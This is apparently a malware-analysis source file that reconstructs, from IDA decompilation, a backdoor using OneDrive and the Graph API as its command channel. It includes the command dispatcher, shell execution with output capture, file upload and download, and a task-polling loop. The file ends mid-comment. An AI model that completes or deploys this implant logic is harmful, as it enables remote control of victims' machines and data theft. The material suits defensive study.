#include "analysis_types.hpp"

#include <cstdint>
#include <cstring>
#include <string>
#include <vector>

#ifdef _WIN32
#include <windows.h>
#else
using HANDLE  = void*;
using BOOL    = int;
using DWORD   = unsigned long;
using LPCSTR  = const char*;
using LPCWSTR = const wchar_t*;
using LPWSTR  = wchar_t*;
using WCHAR   = wchar_t;
struct SECURITY_ATTRIBUTES;
struct STARTUPINFOW { DWORD cb; };
struct PROCESS_INFORMATION { HANDLE hProcess; HANDLE hThread; };
#endif

namespace oceandrift::analysis {

// ============================================================================
// Helper data used by the analysis catalog
// ============================================================================

std::vector<std::string> supported_commands() {
  return {
      "kill",
      "shell",
      "exec",
      "upload",
      "download",
      "sleep",
      "rest",
  };
}

std::vector<std::string> task_paths() {
  return {
      "/job",
      "/result",
      "/upload",
      "/download",
  };
}

// ============================================================================
// IDA Decompilation -- escape_json_string @ 0x00414900
// Size: ~0x1C0 bytes
//
// Summary (malware analysis):
//   Escapes a source string for safe embedding in a JSON value.
//   Handles backslash, double-quote, control characters (\b \t \n \f \r),
//   and emits \uXXXX for non-printable / high-byte characters.
//   Allocates the output buffer at 2x the input length as a heuristic.
// ============================================================================

std::string escape_json_string(const std::string& src)
{
    std::string result;
    result.reserve(2 * src.size());

    const char* ptr = src.data();
    const char* end = ptr + src.size();

    while (ptr != end)
    {
        unsigned char ch = *ptr;

        if (ch < 0x20)
        {
            switch (ch)
            {
            case 0x08: result += "\\b";  break;
            case 0x09: result += "\\t";  break;
            case 0x0A: result += "\\n";  break;
            case 0x0C: result += "\\f";  break;
            case 0x0D: result += "\\r";  break;
            default:
            {
                char buf[8];
                snprintf(buf, 7, "\\u%04x", ch);
                result += buf;
                break;
            }
            }
        }
        else if (ch == '\\' || ch == '"')
        {
            result += '\\';
            result += (char)ch;
        }
        else if (ch < 0x7F)
        {
            result += (char)ch;
        }
        else
        {
            char buf[8];
            snprintf(buf, 7, "\\u%04x", ch);
            result += buf;
        }

        ++ptr;
    }

    return result;
}

// ============================================================================
// IDA Decompilation -- spawn_process_detached @ 0x00412DF0
// Size: ~0x1C0 bytes
//
// Summary (malware analysis):
//   Launches a new process from a command-line string with default
//   creation flags (no console, no window inheritance).  Converts the
//   multi-byte command string to wide-char, calls CreateProcessW,
//   then immediately closes both process and thread handles (fire-and-forget).
//   Returns 0 on success, 1 on failure or empty input.
// ============================================================================

int spawn_process_detached(const std::string& command_line)
{
    if (command_line.empty())
        return 1;

    STARTUPINFOW si;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);

    PROCESS_INFORMATION pi = {};

    /* Convert command line from multi-byte to wide char */
    const char* mbstr = command_line.c_str();
    int wlen = MultiByteToWideChar(
        0xFDE9u,        /* CP_UTF8 or custom code page */
        0, mbstr, -1, nullptr, 0);

    if (wlen <= 0)
        return 1;

    std::wstring wbuf(wlen - 1, L'\0');

    MultiByteToWideChar(
        0xFDE9u, 0, mbstr, -1,
        &wbuf[0], wlen);

    WCHAR* dup = _wcsdup(wbuf.c_str());

    BOOL created = CreateProcessW(
        nullptr,            /* lpApplicationName */
        dup,                /* lpCommandLine     */
        nullptr,            /* lpProcessAttributes */
        nullptr,            /* lpThreadAttributes  */
        FALSE,              /* bInheritHandles     */
        0,                  /* dwCreationFlags     */
        nullptr,            /* lpEnvironment       */
        nullptr,            /* lpCurrentDirectory  */
        &si, &pi);

    free(dup);

    int ret;
    if (created)
    {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        ret = 0;
    }
    else
    {
        GetLastError();
        ret = 1;
    }

    return ret;
}

// ============================================================================
// IDA Decompilation -- run_shell_and_capture_output @ 0x00412560
// Size: ~0x7B0 bytes
//
// Summary (malware analysis):
//   Executes a shell command by building "cmd.exe /c" style invocation
//   that redirects stdout+stderr to a temp file, reads the result back
//   into a string, and stores it in the beacon context output buffer
//   (this+476).  Returns 0 on success, 1 on failure.
//
//   The temp file path is:  %TEMP%\beacon_shell_output.txt
//   The constructed command is:  <command> > "<tempfile>" 2>&1
//   After reading the file, it deletes it via sub_40EB80 (DeleteFileW).
// ============================================================================

int run_shell_and_capture_output(BeaconContext* beacon_ctx,
                                 const std::string& command)
{
    if (command.empty())
        return 1;

    /* Get %TEMP% directory */
    std::wstring temp_dir(0x105, L'\0');
    DWORD temp_len = GetTempPathW(
        (DWORD)temp_dir.size(), &temp_dir[0]);
    temp_dir.resize(temp_len);

    /* Convert temp dir to multibyte */
    std::string temp_dir_mb;
    /* wstring_to_multibyte(temp_dir, temp_dir_mb) */

    /* Build output file path */
    std::string output_path =
        temp_dir_mb + "\\beacon_shell_output.txt";

    /* Build full redirected command:  <cmd> > "<output_path>" 2>&1 */
    std::string full_cmd = command + " > \"" + output_path + "\" 2>&1";

    /* Execute via system() / _popen equivalent */
    intptr_t exec_result = system(full_cmd.c_str());

    /* Read output from the temp file */
    std::string output;

    /* Open file stream on output_path, read contents into output */
    /* std::ifstream ifs(output_path, std::ios::in); */
    /* if (ifs.good()) { read all into output; } */
    /* else output = "Failed to read command output"; */

    /* Truncate output via sub_412FC0 (trims to max length) */

    /* Delete the temp file */
    /* DeleteFileW(output_path_wide); */

    /* Store output into beacon context shell_output field */
    beacon_ctx->shell_output = output;

    return (exec_result != 0) ? 1 : 0;
}

// ============================================================================
// IDA Decompilation -- upload_local_file_to_agent_path @ 0x004134B0
// Size: ~0x9B0 bytes
//
// Summary (malware analysis):
//   Uploads a local file from the agent machine to OneDrive via the
//   Graph API.  Steps:
//     1. Constructs the OneDrive path:  rhs + "/files/" + rhs
//     2. Calls graph_api_get_item_by_path to check if item exists
//     3. If item doesn't exist, returns 1 (failure)
//     4. Resolves the local agent_path to a filesystem path
//     5. If the destination directory doesn't exist, creates it
//     6. Tests write permission by creating a temp file
//        "\\test_write_permission.tmp", writes "test", then deletes it
//     7. Resolves the OneDrive drive path to an item ID
//     8. Calls graph_api_upload_item_content_from_file to upload
//     9. Verifies the local file exists and gets its size
//   Returns 0 on successful upload, 1 on failure.
// ============================================================================

int upload_local_file_to_agent_path(
    BeaconContext*     beacon_ctx,
    const std::string& onedrive_path,
    const char*        agent_path)
{
    if (onedrive_path.empty())
        return 1;

    /* Build OneDrive item path: onedrive_path + "/files/" + onedrive_path */
    std::string item_path = onedrive_path + "/files/" + onedrive_path;

    /* Check if item exists on OneDrive */
    void* graph_session = beacon_ctx->graph_session;
    /* graph_api_get_item_by_path(graph_session, item_info, &item_path) */
    bool item_exists = false; /* v40 */

    if (!item_exists)
        return 1;

    /* Resolve the agent_path to a wide-char filesystem path */
    std::wstring local_wide_path;
    /* sub_41E0D0(wide_buf, agent_path, 0);  -- multibyte-to-wide */
    /* sub_40DFD0(wide_buf, &local_wide_path); */

    /* If path doesn't exist, create it */
    if (local_wide_path.size() != 0)
    {
        /* if (!path_exists(&local_wide_path)) sub_40EDA0(local_wide_path); */
    }

    /* Convert back to multibyte */
    std::string local_path;
    /* wstring_to_multibyte(local_wide_path, local_path); */

    /* Test write permission */
    std::string test_path = local_path +
        "\\test_write_permission.tmp";

    /* Open ofstream on test_path, write "test" */
    /* sub_40B550(ofstream, "test"); */
    /* Delete the test file */
    /* sub_40EB80(test_path_wide); */

    /* Resolve OneDrive path to item ID */
    std::string item_id;
    /* resolve_drive_path_to_item_id(graph_session, &item_id, &item_path); */

    if (item_id.empty())
        return 1;

    /* Upload file content */
    bool upload_ok = false;
    /* upload_ok = graph_api_upload_item_content_from_file(graph_session, &item_id, agent_path); */

    if (!upload_ok)
        return 1;

    /* Verify file exists and get size */
    /* path_exists(agent_path); */
    /* path_file_size(agent_path); */

    return 0;
}

// ============================================================================
// IDA Decompilation -- download_remote_task_file_by_agent_path @ 0x00414D50
// Size: ~0x2B0 bytes
//
// Summary (malware analysis):
//   Downloads a file from the OneDrive-based C2 by agent-relative path.
//   Constructs the full path as: lhs + "/" + a4  (job folder + task id)
//   Resolves the drive path to an item ID, then calls
//   graph_api_download_item_content to fetch the file body.
//   Returns the file content as a string.  If the item is not found,
//   returns an empty string.
// ============================================================================

std::string download_remote_task_file_by_agent_path(
    BeaconContext*     beacon_ctx,
    const std::string& base_path,
    const std::string& task_id)
{
    /* Build full path: base_path + "/" + task_id */
    std::string full_path = base_path + "/" + task_id;

    /* Resolve path to item ID through Graph API */
    void* graph_session = beacon_ctx->graph_session;
    std::string item_id;
    /* resolve_drive_path_to_item_id(graph_session, &item_id, &full_path); */

    std::string content;
    if (item_id.empty())
    {
        /* Item not found -- return empty */
        content = "";
    }
    else
    {
        /* Download the file content */
        /* graph_api_download_item_content(graph_session, &content, &item_id); */
    }

    return content;
}

// ============================================================================
// IDA Decompilation -- select_next_task_id @ 0x00410E70
// Size: ~0x3A0 bytes
//
// Summary (malware analysis):
//   Iterates over a list of pending task names (collected from the C2
//   job folder).  For each name, constructs the full OneDrive path:
//     job_folder_path + "/" + task_name
//   Calls graph_api_get_item_by_path to verify the task file exists.
//   Selects the task whose name sorts lexicographically smallest
//   (earliest task ID wins), enabling FIFO-like ordering.
//   Returns the chosen task ID string (empty if no valid tasks).
// ============================================================================

std::string select_next_task_id(
    BeaconContext*                   beacon_ctx,
    const std::vector<std::string>&  pending_names)
{
    std::string selected_id;
    std::string smallest_name;

    void* graph_session = beacon_ctx->graph_session;
    const std::string& job_path = beacon_ctx->job_path;

    for (auto it = pending_names.begin();
         it != pending_names.end(); ++it)
    {
        const std::string& task_name = *it;

        /* Build full path: job_path + "/" + task_name */
        std::string check_path = job_path + "/" + task_name;

        /* Verify item exists via Graph API */
        /* graph_api_get_item_by_path(graph_session, item_info, &check_path); */
        bool exists = false; /* v35 */

        if (!exists)
            continue;

        /* If this is the first valid task, or it sorts before current smallest */
        if (smallest_name.empty()
            || task_name < smallest_name)
        {
            smallest_name = task_name;
            selected_id   = task_name;
        }
    }

    return selected_id;
}

// ============================================================================
// IDA Decompilation -- publish_task_result @ 0x004150D0
// Size: ~0xFD0 bytes
//
// Summary (malware analysis):
//   Publishes the result of a completed task back to the C2 server
//   via OneDrive Graph API.  Steps:
//     1. Strips ".txt" and ".tmp" suffixes from the task name to get
//        a base name for the result file.
//     2. If the command was "shell", escapes the output string for JSON
//        and constructs a JSON body:
//          {"status":"success","result":"<escaped_output>"}
//        or {"status":"failed",...} on error.
//     3. For non-shell commands, serializes the result JSON object
//        including a "status" field ("success" or "failed") and
//        iterates over result key-value pairs.
//     4. Writes the result as:  <base_name>.txt  into the /result
//        folder first, then into the /download folder as backup.
//     5. Clears the beacon context shell output buffer (offset +476).
// ============================================================================

bool publish_task_result(
    BeaconContext*     beacon_ctx,
    const std::string& task_info,
    int                error_code,
    void*              result_data)
{

    /* Copy task name and strip extensions */
    std::string base_name = task_info;

    /* Strip all ".txt" suffixes */
    while (true)
    {
        size_t pos = base_name.find(".txt");
        if (pos == std::string::npos)
            break;
        base_name = base_name.substr(0, pos);
    }

    /* Strip ".tmp" suffix if present */
    size_t tmp_pos = base_name.find(".tmp");
    if (tmp_pos != std::string::npos)
    {
        base_name = base_name.substr(0, tmp_pos);
    }

    /* Get command name from task_info (offset +24, len at +40) */
    std::string command_name;  /* extracted from Src+6 (sso_string at offset 24) */
    /* sub_41FF20 checks string equality */

    bool is_shell_command = (command_name == "shell");

    std::string json_body;
    bool write_ok = false;

    if (is_shell_command)
    {
        /* Get output text: either from result_data["output"] or beacon ctx shell buffer */
        std::string output_text;
        bool has_output = false; /* json_has_member(result_data, "output") */

        if (has_output)
        {
            /* output_text = json_get_string(json_get_object_member(result_data, "output")) */
        }
        else
        {
            /* Copy from beacon context shell output buffer */
            /* output_text = beacon_ctx->shell_output; */
        }

        /* Escape the output for JSON embedding */
        std::string escaped = escape_json_string(output_text);

        /* Build JSON: {"status":"success","result":"<escaped>"} */
        json_body = std::string("{\"status\":\"success\",\"result\":\"")
                  + escaped + "\"}";

        /* Write result file: base_name + ".txt" to /result folder */
        /* sub_416220(beacon_ctx, beacon_ctx->result_path, &result_path, &json_body); */

        /* If first write failed, retry to /download folder */
        /* sub_416220(beacon_ctx, beacon_ctx->result_path, &download_path, &json_body); */
    }
    else
    {
        /* Non-shell: build result JSON from result_data object */
        /* Initialize JSON value for the result object */

        /* Copy result_data members into the JSON object */

        /* Set "status" field: "success" or "failed" */
        std::string status_str = (error_code != 0)
            ? "failed" : "success";
        /* json_set_string(result_json, "status", status_str); */

        /* If result_data has key-value pairs, iterate and copy them */

        /* If no "result" key exists, add one with empty string */
        /* json_set_string(result_json, "result", ""); */

        /* Serialize to string */

        /* Write: base_name + ".txt" to /result folder */
        /* If failed, retry to /download folder */
    }

    /* Clear beacon context shell output buffer */
    beacon_ctx->shell_output.clear();

    return write_ok;
}

// ============================================================================
// IDA Decompilation -- beacon_context_init @ 0x0040EE30
// Size: ~0x1F0 bytes
//
// Summary (malware analysis):
//   Constructor for the beacon context structure.  Copies five SSO
//   strings from the source config (client_id, client_secret,
//   refresh_token, tenant_id, drive_root -- 24 bytes each at offsets
//   0, 24, 48, 72, 96), three integer fields (sleep_seconds,
//   unknown_124, unknown_128), then zero-initializes all remaining
//   fields:
//     +132 graph_session ptr    (nullptr)
//     +136..+228  seven SSO strings (agent_id, base_path, job_path,
//            result_path, upload_path, download_path, last_error)
//     +280  running_flag (0)
//     +281  alive_flag   (0)
//     +284..+299  worker thread handles (zeroed)
//     +300  mutex_1  (_Mtx_init_in_situ, type 2 = recursive)
//     +348  mutex_2  (_Mtx_init_in_situ, type 2 = recursive)
//     +396  cond_var_1  (initialized)
//     +436  cond_var_2  (initialized)
//     +476  shell_output string (empty)
// ============================================================================

void beacon_context_init(BeaconContext* ctx, const BeaconContext* src_config)
{
    /* Copy five config strings */
    ctx->client_id      = src_config->client_id;
    ctx->client_secret  = src_config->client_secret;
    ctx->refresh_token  = src_config->refresh_token;
    ctx->tenant_id      = src_config->tenant_id;
    ctx->drive_root     = src_config->drive_root;

    /* Copy integer fields */
    ctx->sleep_seconds  = src_config->sleep_seconds;
    ctx->field_124      = src_config->field_124;
    ctx->field_128      = src_config->field_128;

    /* Zero-initialize graph session pointer */
    ctx->graph_session  = nullptr;

    /* Initialize empty path strings */
    ctx->agent_id       = {};
    ctx->base_path      = {};
    ctx->job_path       = {};
    ctx->result_path    = {};
    ctx->upload_path    = {};
    ctx->download_path  = {};

    /* running_flag = 0, alive_flag = 0 */
    ctx->running_flag   = 0;
    ctx->alive_flag     = 0;

    /* Zero thread data */
    memset(ctx->thread_handle_1, 0, sizeof(ctx->thread_handle_1));
    memset(ctx->thread_handle_2, 0, sizeof(ctx->thread_handle_2));

    /* Initialize mutexes (type 2 = recursive) */
    /* _Mtx_init_in_situ(&ctx->mutex_1, 2); */
    /* _Mtx_init_in_situ(&ctx->mutex_2, 2); */

    /* Initialize condition variables */
    /* cond_var_init(&ctx->cond_var_1); */
    /* cond_var_init(&ctx->cond_var_2); */

    /* Initialize shell_output string (empty) */
    ctx->shell_output   = {};
}

// ============================================================================
// IDA Decompilation -- beacon_initialize @ 0x0040F4A0
// Size: ~0x660 bytes
//
// Summary (malware analysis):
//   Full beacon initialization sequence:
//     1. Copies OAuth config fields (client_id, client_secret,
//        refresh_token, tenant_id) from the beacon context.
//     2. Sets OAuth scope to "offline_access Files.Read Files.ReadWrite"
//     3. Creates a Graph API session via graph_api_session_create
//     4. Copies the drive_root into the session's path config
//     5. Calls graph_api_refresh_access_token to obtain initial token
//     6. Generates machine GUID via build_host_machine_guid
//        and stores it as the agent_id (this+136)
//     7. Constructs OneDrive folder paths:
//        - base_path   = drive_root + "/" + agent_id      (this+160)
//        - job_path    = base_path  + "/job"              (this+184)
//        - result_path = base_path  + "/result"           (this+208)
//        - upload_path = base_path  + "/upload"           (this+232)
//        - download_path = base_path + "/download"        (this+256)
//     8. Lists root children to check if agent folder exists;
//        if found, calls write_beacon_alive_file; otherwise
//        calls ensure_job_result_paths_exist to create folders,
//        then uploads host profile via write_remote_text_file
//        with filename "info.txt"
//   Returns true on success, false on failure.
// ============================================================================

bool beacon_initialize(BeaconContext* beacon_ctx)
{
    /* Extract config strings from context */
    std::string client_id      = beacon_ctx->client_id;
    std::string client_secret  = beacon_ctx->client_secret;
    std::string refresh_token  = beacon_ctx->refresh_token;
    std::string tenant_id      = beacon_ctx->tenant_id;

    std::string scope = "offline_access Files.Read Files.ReadWrite";

    /* Create Graph API session */
    void* new_session = nullptr;
    /* new_session = graph_api_session_create(&client_id); */

    /* Replace current session */
    void* old_session = beacon_ctx->graph_session;
    beacon_ctx->graph_session = new_session;
    /* destroy old session if non-null */

    /* Copy drive_root into session path config (session->refresh_token) */
    /* session->refresh_token = beacon_ctx->client_id; -- drive_root at offset 0 */

    /* Refresh access token */
    if (!beacon_ctx->graph_session /* graph_api_refresh_access_token(session) fails */)
        return false;

    /* Generate agent identifier from machine GUID */
    std::string agent_id;
    /* agent_id = build_host_machine_guid(); */
    beacon_ctx->agent_id = std::move(agent_id);

    /* Check agent_id is not empty */
    if (beacon_ctx->agent_id.empty())
        return false;

    /* Build base_path = drive_root + "/" + agent_id */
    beacon_ctx->base_path = beacon_ctx->drive_root + "/" + beacon_ctx->agent_id;

    /* Build job_path = base_path + "/job" */
    beacon_ctx->job_path = beacon_ctx->base_path + "/job";

    /* Build result_path = base_path + "/result" */
    beacon_ctx->result_path = beacon_ctx->base_path + "/result";

    /* Build upload_path = base_path + "/upload" */
    beacon_ctx->upload_path = beacon_ctx->base_path + "/upload";

    /* Build download_path = base_path + "/download" */
    beacon_ctx->download_path = beacon_ctx->base_path + "/download";

    /* List root children to check for existing agent folder */
    /* graph_api_list_root_children(session, &children_list); */

    /* Iterate children, compare each folder name against agent_id */
    /* for each child:
         if (child.is_folder && child.name == beacon_ctx->agent_id) {
             write_beacon_alive_file(beacon_ctx);
             return true;
         } */

    /* Agent folder not found -- create directory structure */
    if (true /* ensure_job_result_paths_exist(beacon_ctx) */)
    {
        /* Build and upload host profile */
        std::string host_profile;
        /* build_host_profile_json(&host_profile); */

        std::string info_filename = "info.txt";

        /* Upload info.txt with host profile content */
        /* write_remote_text_file(beacon_ctx->base_path, &info_filename, &host_profile); */

        return true;
    }

    return false;
}

// ============================================================================
// IDA Decompilation -- beacon_start_workers @ 0x0040FB00
// Size: ~0x120 bytes
//
// Summary (malware analysis):
//   Starts the beacon's worker threads if not already running.
//     1. Checks running_flag (this+280); if already set, returns
//     2. Sets running_flag = 1  and alive_flag = 1
//     3. Sleeps for field_128 seconds (initial delay from config)
//     4. Creates first thread running beacon_worker_loop
//        Stores thread handle at this+284
//     5. Creates second thread running sub_40FD30
//        (likely the keep-alive / heartbeat loop)
//        Stores thread handle at this+292
//     6. If either thread creation fails, calls terminate()
// ============================================================================

bool beacon_start_workers(BeaconContext* beacon_ctx)
{
    /* If already running, return */
    if (beacon_ctx->running_flag != 0)
        return true;

    /* Set running + alive flags */
    beacon_ctx->running_flag = 1;
    beacon_ctx->alive_flag   = 1;

    /* Initial sleep delay from config */
    int64_t delay_seconds = beacon_ctx->field_128;
    /* sleep_for_seconds(&delay_seconds); */

    /* Create worker thread 1: beacon_worker_loop */
    /* thread_1 = create_thread(beacon_worker_loop, beacon_ctx); */
    /* Store in thread_handle_1 */

    /* If thread handle slot already occupied, terminate */
    if (beacon_ctx->thread_handle_1[1] != 0)
    {
        /* terminate(); */
        return false;
    }

    /* Create worker thread 2: heartbeat / keepalive */
    /* thread_2 = create_thread(heartbeat_loop, beacon_ctx); */
    /* Store in thread_handle_2 */

    if (beacon_ctx->thread_handle_2[1] != 0)
    {
        /* terminate(); */
        return false;
    }

    return true;
}

// ============================================================================
// IDA Decompilation -- execute_beacon_command @ 0x00411220
// Size: ~0x12C0 bytes
//
// Summary (malware analysis):
//   Main command dispatcher.  Reads the "command" field from a parsed
//   task JSON object and dispatches to the appropriate handler.
//   Supported verbs (checked via string comparison at the noted addresses):
//
//   "kill"     (0x41129B) -- calls beacon_kill_now(this) to terminate
//   "shell"    (0x4112C1) -- extracts "params" string, calls
//                            run_shell_and_capture_output, stores result
//                            in task output field
//   "exec"     (0x411568) -- extracts "params" string, calls
//                            spawn_process_detached (fire-and-forget)
//   "upload"   (0x411710) -- requires JSON params with "onedrive_path"
//                            and "agent_path" keys; calls
//                            upload_local_file_to_agent_path
//   "download" (0x41190C) -- requires string param (file path); calls
//                            sub_413EF0 to download, stores filename
//                            in result
//   "sleep"    (0x411C4F) -- parses integer from params, updates
//                            sleep_seconds (this+120)
//   "rest"     (0x411D54) -- parses integer from params, calls
//                            sleep_seconds_checked to sleep immediately
//
//   Unknown commands produce error: "Unknown command: <verb>"
//
//   After dispatch, sets task status to "completed" or "failed",
//   timestamps the result, and if the command was "shell" and output
//   exceeds 100 chars, truncates to 100 + "..."
//   Finally calls publish_task_result and returns the error code.
// ============================================================================

int execute_beacon_command(BeaconContext* beacon_ctx, void* task_obj)
{
    char* task  = (char*)task_obj;
    int   result = 0;

    /* Get command name string from task_obj (offset +24, len at +40) */
    std::string command;   /* extracted from task+24 */
    /* Get params from task_obj (offset +48, type byte, +48 value) */

    /* ---- "kill" ---- */
    /* sub_41FF20(command.c_str(), command.size(), "kill", 4) */
    if (command == "kill")
    {
        /* beacon_kill_now(beacon_ctx); */
        /* This sets running_flag=0, does not return normally */
    }

    /* ---- "shell" ---- */
    if (command == "shell")
    {
        std::string shell_cmd;

        /* If params type == 3 (string), extract it */
        if (task[48] == 3)
        {
            /* shell_cmd = json_get_string(task+48, ...); */
        }
        else
        {
            shell_cmd = "";   /* empty default */
        }

        result = run_shell_and_capture_output(beacon_ctx, shell_cmd);

        if (result == 0)
        {
            /* Copy shell output into task result["output"] field */
            /* json_set(task+136, "output", shell_output_value); */
        }

        goto done;
    }

    /* ---- "exec" ---- */
    if (command == "exec")
    {
        std::string exec_cmd;

        if (task[48] == 3)
        {
            /* exec_cmd = json_get_string(task+48, ...); */
        }
        else
        {
            exec_cmd = "";
        }

        result = spawn_process_detached(exec_cmd);
        goto done;
    }

    /* ---- "upload" ---- */
    if (command == "upload")
    {
        /* Check params type == 1 (object) and has required keys */
        if (task[48] == 1
            && true /* json_has_member(task+48, "onedrive_path") */
            && true /* json_has_member(task+48, "agent_path")    */)
        {
            /* Extract paths from JSON params */
            std::string agent_path;
            /* agent_path = json_get_string(task+48["agent_path"]); */

            std::string onedrive_path;
            /* onedrive_path = json_get_string(task+48["onedrive_path"]); */

            result = upload_local_file_to_agent_path(
                beacon_ctx, onedrive_path, agent_path.c_str());

            goto done;
        }
        else
        {
            /* Missing required parameters */
            /* json_set(task+136, "error",
               "Missing required parameters: onedrive_path and/or agent_path"); */
            result = 1;
            goto done;
        }
    }

    /* ---- "download" ---- */
    if (command == "download")
    {
        if (task[48] != 3)   /* params must be string type */
        {
            /* json_set(task+136, "error",
               "Download parameter must be a string file path"); */
            result = 1;
            goto done;
        }

        /* Get file path from params string */
        std::string download_path;
        /* download_path = json_get_string(task+48); */

        std::string local_path;
        /* result = sub_413EF0(self, &download_path, &local_path); */

        if (result != 0)
            goto done;

        /* Convert to wide path, get filename */
        std::string filename;
        /* Convert download_path to wide, extract filename component
           via sub_40E060, convert back to multibyte */

        /* Set result["filename"] = filename */
        /* json_set(task+136, "filename", filename); */

        goto done;
    }

    /* ---- "sleep" ---- */
    if (command == "sleep")
    {
        int new_sleep = 0;

        /* If params is a numeric JSON type (5/6/7), extract directly */
        char param_type = task[48];
        if (param_type == 5 || param_type == 6 || param_type == 7)
        {
            /* new_sleep = sub_419D70(task+48);  -- json to int */
        }

        /* If params is string type (3), parse as integer */
        if (param_type == 3)
        {
            std::string sleep_str;
            /* sleep_str = json_get_string(task+48); */
            char* endptr;
            int parsed = strtol(sleep_str.c_str(), &endptr, 10);

            if (sleep_str.c_str() == endptr)
            {
                /* throw "invalid stoi argument" */
            }
            new_sleep = parsed;
        }

        if (new_sleep > 0)
        {
            beacon_ctx->sleep_seconds = new_sleep;
            result = 0;
        }
        else
        {
            result = 1;
        }
        goto done;
    }

    /* ---- "rest" ---- */
    if (command == "rest")
    {
        int rest_seconds = 0;

        char param_type = task[48];
        if (param_type == 5 || param_type == 6 || param_type == 7)
        {
            /* rest_seconds = sub_419D70(task+48); */
        }

        if (param_type == 3)
        {
            std::string rest_str;
            /* rest_str = json_get_string(task+48); */
            char* endptr;
            rest_seconds = strtol(rest_str.c_str(), &endptr, 10);

            if (rest_str.c_str() == endptr)
            {
                /* throw "invalid stoi argument" */
            }
        }

        /* Sleep immediately for the specified duration */
        /* result = sleep_seconds_checked(rest_seconds); */
        goto done;
    }

    /* ---- Unknown command ---- */
    {
        std::string error_msg =
            "Unknown command: " + command;

        /* json_set(task+136, "error", error_msg); */

        result = 2;
    }

done:
    /* Set task status string: "completed" or "failed" */
    const char* status = (result != 0) ? "failed" : "completed";
    /* string_assign_n(task+64, status, strlen(status)); */

    /* Timestamp the result */
    /* task.end_time = format_local_timestamp(); */

    /* If command was not "failed" and no "error" key exists, add default error */
    if (result != 0)
    {
        /* if (!json_has_member(task+136, "error")) */
        /*     json_set(task+136, "error", "Command execution failed"); */
    }

    /* If command was "shell" and succeeded: */
    if (result == 0 && command == "shell")
    {
        /* Truncate output if > 100 chars */
        if (beacon_ctx->shell_output.size() > 100)
        {
            beacon_ctx->shell_output = beacon_ctx->shell_output.substr(0, 100) + "...";
        }
    }

    /* If command was "download" and succeeded, set result["agent_path"] */

    /* If command was "upload" and succeeded, set result["agent_path"] */

    /* Publish result to C2 */
    publish_task_result(beacon_ctx, *(std::string*)task, result,
                        (void*)(task + 136));

    return result;
}

// ============================================================================
// IDA Decompilation -- beacon_worker_loop @ 0x00410320
// Size: ~0x740 bytes
//
// Summary (malware analysis):
//   Main polling loop for the beacon.  Runs as a dedicated thread,
//   continuously polling the C2 OneDrive folder for new task files.
//
//   Loop body:
//     1. Check running_flag (this+280); if false, return
//     2. Call collect_pending_task_names(this, &task_list) to list
//        files in the /job folder
//     3. If task_list is non-empty:
//        a. select_next_task_id(this, &task_id, &task_list)
//        b. If task_id is non-empty:
//           i.   download_remote_task_file_by_agent_path(this, &content,
//                  this+184 (job_path), &task_id)
//           ii.  If content is non-empty, parse JSON task:
//                - Extract "command" and "params" fields
//                - Set status to "inprogress"
//                - Set start timestamp
//                - Build task file path: job_path + "/" + task_id
//                - Delete the task file from OneDrive via
//                  graph_api_delete_item_by_path
//                - Call execute_beacon_command(this, &parsed_task)
//                - Set status to "completed" or "failed"
//                - If command != "kill" and status == "completed":
//                  publish_task_result(this, &parsed_task, error, &result)
//     4. Lock mutex (this+300)
//     5. Wait on condition variable (this+396) with timeout = sleep_seconds
//        (this+120)
//     6. Unlock mutex and loop back to step 1
// ============================================================================

void beacon_worker_loop(BeaconContext* beacon_ctx)
{
    while (true)
    {
        /* Check if still running */
        if (beacon_ctx->running_flag == 0)
            return;

        /* Collect pending task file names from C2 /job folder */
        std::vector<std::string> task_list;
        /* collect_pending_task_names(beacon_ctx, &task_list); */

        if (!task_list.empty())
        {
            /* Select the next task (lexicographically smallest) */
            std::string task_id;
            /* task_id = select_next_task_id(beacon_ctx, task_list); */

            if (!task_id.empty())
            {
                /* Download task file content */
                std::string content;
                /* content = download_remote_task_file_by_agent_path(
                       beacon_ctx, beacon_ctx->job_path, task_id); */

                if (!content.empty())
                {
                    /* Parse JSON task content */
                    /* sub_419B00(&parsed_json, &content, ...); */

                    /* Copy task_id for later use */
                    std::string task_id_copy = task_id;

                    /* Initialize task execution context */
                    /* sub_410A60(&exec_ctx); */

                    /* Copy command string into exec context */
                    /* exec_ctx.command = task_content; */

                    /* Extract "command" field from parsed JSON */
                    std::string command;
                    /* json_get_value(parsed_json, "command"); */

                    /* Extract "params" field */
                    /* json_get_value(parsed_json, "params"); */

                    /* Set initial status = "inprogress" */
                    std::string status = "inprogress";

                    /* Timestamp start and end */
                    std::string start_time;
                    /* start_time = format_local_timestamp(); */
                    std::string end_time;
                    /* end_time = format_local_timestamp(); */

                    /* Build task file path: job_path + "/" + task_id */
                    std::string task_file_path =
                        beacon_ctx->job_path + "/" + task_id;

                    /* Delete the task file from OneDrive (claim it) */
                    void* graph_session = beacon_ctx->graph_session;
                    bool deleted = true;
                    /* deleted = graph_api_delete_item_by_path(
                         graph_session, &task_file_path); */

                    if (deleted)
                    {
                        /* Execute the command */
                        int exec_result =
                            execute_beacon_command(beacon_ctx, nullptr /*task*/);

                        /* Update status based on result */
                        const char* final_status =
                            (exec_result != 0) ? "failed" : "completed";
                        status = final_status;

                        /* Update end timestamp */
                        /* end_time = format_local_timestamp(); */

                        /* If command is "kill", skip publishing */
                        if (command != "kill")
                        {
                            /* If status is "completed", publish with success */
                            bool is_completed = (status == "completed");
                            publish_task_result(
                                beacon_ctx, task_id_copy,
                                !is_completed, nullptr);
                        }
                    }

                    /* Clean up parsed JSON */
                }
            }
        }

        /* Lock mutex and wait on condition variable with sleep timeout */
        /* _Mtx_lock(&beacon_ctx->mutex_1); */
        int64_t sleep_ms = beacon_ctx->sleep_seconds;
        /* condvar_wait_for(&beacon_ctx->cond_var_1, &mutex_guard, &sleep_ms); */
        /* _Mtx_unlock(&beacon_ctx->mutex_1); */

    } /* end while(true) */
}

// ============================================================================
// IDA Decompilation -- beacon_is_running @ 0x0040FE50
// Size: ~0x10 bytes
//
// Summary (malware analysis):
//   Trivial accessor; returns true when the running_flag field (this+280)
//   is nonzero.  Called by the main thread's spin-wait loop.
// ============================================================================

bool beacon_is_running(BeaconContext* ctx)
{
    return ctx->running_flag != 0;
}

// ============================================================================
// IDA Decompilation -- beacon_stop_workers @ 0x0040FC30
// Size: ~0x120 bytes
//
// Summary (malware analysis):
//   Signals the worker threads to stop and waits for them to exit.
//   Sets running_flag and alive_flag to 0, broadcasts the condition
//   variable so sleeping workers wake up, then joins both threads.
